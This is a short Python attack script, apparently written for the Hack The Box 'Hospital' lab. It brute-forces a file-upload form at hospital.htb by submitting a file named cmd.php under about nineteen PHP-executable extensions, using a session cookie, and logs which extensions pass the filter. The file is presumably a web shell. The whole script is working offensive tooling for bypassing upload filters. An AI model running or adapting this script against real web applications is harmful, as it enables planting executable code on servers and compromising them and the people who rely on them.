#!/usr/bin/env python3

import requests
import pdb
import signal
import sys
import time

from termcolor import colored
from pwn import *

def def_handler(sig, frame):
    print(colored(f"\n\n[!] Exiting fileUpload_hospital.py script....\n", 'red'))
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

upload_url = "http://hospital.htb:8080/upload.php"
cookies = {'PHPSESSID': 'h1med6umtjeiivm578ocld7svk'}
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
extensions = [".php", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7", ".phps", ".pht", ".phtm", ".phtml", ".pgif", ".shtml", ".htaccess", ".phar", ".inc", ".hphp", ".ctp", ".module"]

def fileUpload():

    f = open("/home/shadow42/hax0rn00b/hospital/cmd.php", "r")
    fileContent = f.read()

    p1 = log.progress("Valid Extension Finder")
    p1.status("Initiating the brute force attack")
    time.sleep(2)

    for extension in extensions:
        p1.status(f"Attempting with extension {extension}")
        fileToUpload = {'image': (f"cmd{extension}", fileContent.strip())}
        r = requests.post(upload_url, cookies=cookies, files=fileToUpload, allow_redirects=False)
        #print(r.status_code)
        #pdb.set_trace()
        if "failed" not in r.headers["Location"]:
            log.info(f"Extension {extension}: {r.headers['Location']}")
        time.sleep(1)


if __name__ == '__main__':
    fileUpload()